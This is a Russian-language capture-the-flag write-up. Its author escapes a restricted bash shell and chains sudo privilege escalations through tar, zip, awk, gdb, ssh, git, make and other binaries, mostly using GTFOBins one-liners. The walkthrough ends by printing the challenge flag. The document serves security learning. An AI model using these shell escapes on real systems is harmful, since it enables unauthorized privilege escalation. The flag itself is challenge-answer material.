1. Подключаемся к машине и пробуем осмотреться. ls не работает и понимаем что это rbash.
2. Пробуем осмотреться с по мощью echo  и успешно.
3. Находим доступный нам vim. Отлично, пробуем использовать его для получения bash shell:
```
:set shell=/bin/bash
:shell
```
 И успешно.
4. Проверяем sudo -l, видим путь до sudo/
5. Проверяем /usr/bin/sudo -l и видим что sudo позволяет нам запустить python.
6. Используем эту возможность : ```
```
app-script-ch14@challenge02:~$ /usr/bin/sudo -u app-script-ch14-2 /usr/bin/python
```
 Далее вводим: "
 ```
import os
```
```
os.system('/bin/bash')
```
И проходим дальше.
7. Вывод sudo -l :
User app-script-ch14-2 may run the following commands on challenge02:
    (app-script-ch14-3) NOPASSWD: /bin/tar
8. Здесь и далее на помощь приходить GTFOBins:
```
sudo -u app-script-ch14-3 /bin/tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
 И успешно проходим.
 1. Снова проверяем sudo -l :
 User app-script-ch14-3 may run the following commands on challenge02:
    (app-script-ch14-4) NOPASSWD: /usr/bin/zip
10. Находим команду на  GTFOBins:
```
sudo -u app-script-ch14-4 /usr/bin/zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

Проходим далее.
11. И снова  sudo -l : 
 User app-script-ch14-4 may run the following commands on challenge02:
    (app-script-ch14-5) NOPASSWD: /usr/bin/awk
И снова  GTFOBins:
```
sudo -u app-script-ch14-5 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```
12. sudo -l :
User app-script-ch14-5 may run the following commands on challenge02:
    (app-script-ch14-6) NOPASSWD: /usr/bin/gdb
13. Запускаем команду: 
```
sudo -u app-script-ch14-6 /usr/bin/gdb
```
и используем ранее применяемую команду python:
```
python import os; os.system('/bin/bash')
```
 И получаем следующую оболочку.
 14. sudo -l :
 User app-script-ch14-6 may run the following commands on challenge02:
    (app-script-ch14-7) NOPASSWD: /usr/bin/pico
15. В описании pico находим интересные сведения о его проверке орфографии, а так же интересный способ его использования))) и Запускаем команду: 
```
sudo -u app-script-ch14-7 pico
```
 
Далее нажимаем CTRL +R и CTRL+X
В "Command to execute" вводим: reset; sh 1>&0 2>&0
И получаем shell app-script-ch14-7
16. sudo -l
User app-script-ch14-7 may run the following commands on challenge02:
    (app-script-ch14-8) NOPASSWD: /usr/bin/scp
Изучаем man по scp и находим следующее: 
-S _program_ — Name of program to use for the encrypted connection. The _program_ must understand ssh(1) options.
17. Но попробуем реализовать другой вариант:
$ TF=$(mktemp)
$ echo 'sh 0<&2 1>&2' > $TF
$ chmod +x "$TF"
$ sudo -u app-script-ch14-8 scp -S $TF x y:
Но получаем: /bin/sh: 0: Can't open /tmp/tmp.hcsXxSnA6D
lost connection
18. Создадим новый каталог:
$  mkdir /tmp/caca
$ cd /tmp/caca
$ echo 'sh 0<&2 1>&2' > /tmp/caca/cmd.sh
$ chmod +x cmd.sh
$ sudo -u app-script-ch14-8 scp -S /tmp/caca/cmd.sh x y:
После выполнения команд вывода не последовало, проверяем и видим :
$ whoami 
app-script-ch14-8
19. $ sudo -l
User app-script-ch14-8 may run the following commands on challenge02:                                                                                                                                
    (app-script-ch14-9) NOPASSWD: /usr/bin/env 
20. Ну это уже просто: 
```
sudo -u app-script-ch14-9 env /bin/sh
```
21. $ sudo -l                                                                                                                                               
    (app-script-ch14-10) NOPASSWD: /usr/bin/ssh
Поиск информации привёл к способу выполнения команды ещё до установки соединения, пробуем, но в этот раз не успешно:  
```
$ sudo -u app-script-ch14-10 /usr/bin/ssh -o ProxyCommand="sh -c './run.sh'" 127.0.0.1          
Could not create directory '/challenge/app-script/ch14/.ssh'.     
sh: 1: ./run.sh: not found                                                               
ssh_exchange_identification: Connection closed by remote host
$ ./shell                                                                                         
/bin/sh: 4: ./shell: not found
```                          
22. Пробуем другой способ:
```
$ sudo -u app-script-ch14-10 ssh -o ProxyCommand=';sh 0<&2 1>&2' x
Could not create directory '/challenge/app-script/ch14/.ssh'.
```     
 И на этот раз:
```
$ whoami  
app-script-ch14-10           
$
```
23. sudo -l
User app-script-ch14-10 may run the following commands on challenge02:
    (app-script-ch14-11) NOPASSWD: /usr/bin/git
24. Воспользуемся возможностью выполнить команду с помощью вызова help:
```
sudo -u app-script-ch14-11 git -p help config !/bin/sh
```

Открывается man  и bash, проверяем: 
```
$ whoami
app-script-ch14-11

```
25. sudo -l
```
User app-script-ch14-11 may run the following commands on challenge02:                                             
    (app-script-ch14-12) NOPASSWD: /usr/bin/make
```
И Снова на помощь приходит GTFOBins, правда с поправками:
Источник гласит, что команды не сработают, т.к. флаг --eval не поддерживается. Значит снова пойдём другим путём! Создадим в tmp новую папку и файл Makefile с содержимым: makeit: /bin/sh . И Выполним :
sudo -u app-script-ch14-12 make
```
$ mkdir /tmp/mk^C
$ cd /tmp/mk
$ vim Makefile
$ cat Makefile
makeit:
        /bin/sh
$ sudo -u app-script-ch14-12 make^C
$ whoami
app-script-ch14-12
$ 
```
26. sudo -l 
User app-script-ch14-12 may run the following commands on challenge02:
    (app-script-ch14-13) NOPASSWD: /usr/bin/script
GTFOBins по этому поводу говорит: ```
```
script -q /dev/null
```
Делаем: sudo -u app-script-ch14-13 script -q /dev/null
И проходим.
27. sudo -l 
User app-script-ch14-13 may run the following commands on challenge02:
    (app-script-ch14-14) NOPASSWD: /bin/rbash --
И  видим rbash. 
По этому: ```
```
sudo -u app-script-ch14-14 /bin/rbash --
```
 И идём дальше.
 28. Sudo -l как и в начале не работает, но это мы уже проходили:
```
app-script-ch14-14@challenge02:~/step14$ sudo -l
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
app-script-ch14-14@challenge02:~/step14$ echo ./*
./sl
app-script-ch14-14@challenge02:~/step14$
```
Запускаем ./sl и понимаем что запустить его не получится : 
rbash: ./sl: restricted: cannot specify `/' in command names
Поиски привели только к возможности использовать mapfile и прочитать passwd: 
```
app-script-ch14-14@challenge02:~/step14$ mapfile ARRAY < ../.passwd ARRAY
app-script-ch14-14@challenge02:~/step14$ echo $ARRAY
3sc@p3_G@m3s_@r3_R34lly_Fun!!
app-script-ch14-14@challenge02:~/step14$
```
29. Долгожданный флаг получен!!!!
Скриншоты по проделанной работе прилагаю ниже:![[Снимок экрана 2024-11-04 213641.png]]![[Снимок экрана 2024-11-05 005230.png]]

![[Снимок экрана 2024-11-05 005545.png]]

![[Снимок экрана 2024-11-05 005747.png]]

![[Снимок экрана 2024-11-05 012019.png]]

![[Снимок экрана 2024-11-05 012947.png]]

![[Снимок экрана 2024-11-06 233454.png]]

![[Снимок экрана 2024-11-06 235405.png]]

![[Снимок экрана 2024-11-07 000819.png]]

![[Снимок экрана 2024-11-04 214356.png]]

![[Снимок экрана 2024-11-04 215758.png]]

![[Снимок экрана 2024-11-04 220226.png]]

![[Снимок экрана 2024-11-04 221215.png]]

![[Снимок экрана 2024-11-04 221341.png]]

![[Снимок экрана 2024-11-04 221723.png]]

![[Снимок экрана 2024-11-05 001745.png]]

![[Снимок экрана 2024-11-05 003540.png]]

![[Снимок экрана 2024-11-05 003720.png]]

![[Снимок экрана 2024-11-05 004424.png]]